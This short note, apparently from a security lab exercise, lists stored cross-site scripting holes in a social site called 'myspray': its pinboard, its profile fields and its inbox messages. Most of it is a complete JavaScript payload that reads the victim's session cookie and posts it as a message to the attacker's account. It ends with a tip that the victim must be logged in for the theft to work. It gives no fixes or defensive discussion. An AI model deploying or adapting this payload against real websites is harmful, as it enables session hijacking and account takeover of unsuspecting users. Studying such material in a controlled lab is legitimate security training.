
There are Vulnerabilities for XSS in:
myspray/mypage.html -> Graffiti pinboard

myspray/mypage.html -> User data, the user can add scripts in his "information" fields, like
interests, 'about me', etc.

myspray/inbox.html -> the messages can contain malicious scripts as well.

Example of script that sends user cookie to Hanni Ball:

<script type='text/javascript'>
var cookie_name = "sessionid";
var hackerId = 100;
var match = document.cookie.match(new RegExp('(^| )' + cookie_name + '=([^;]+)'));
  if (match){
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://10.0.23.22/myspray/writemessage" + hackerId + ".html", true);
    xhr.withCredentials = true;
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    let message = 'subject=SessionId&message=Session cookie=' +  match[2];
    xhr.send(message);
  }
</script>


IMPORTANT: The user has to be loged in when you try to steal his session.
